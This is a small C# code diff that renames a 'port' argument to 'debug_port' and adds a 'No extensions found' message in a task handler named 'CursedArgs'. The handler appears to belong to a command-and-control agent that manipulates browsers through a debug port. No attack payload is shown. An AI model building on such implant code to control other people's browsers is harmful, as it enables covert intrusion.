@@ -29,9 +29,9 @@ namespace Agent
         {
             CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);
 
-            if(args.port > 0)
+            if(args.debug_port > 0)
             {
-                this.config.debug_port = args.port.ToString();
+                this.config.debug_port = args.debug_port.ToString();
             }
 
             if(args.parent > 0)
@@ -58,7 +58,7 @@ namespace Agent
             if (extensions.Count <= 0)
             {
                 //No extensions installed
-
+                ReturnOutput("[!] No extensions found", task_id);
                 return;
             }
 
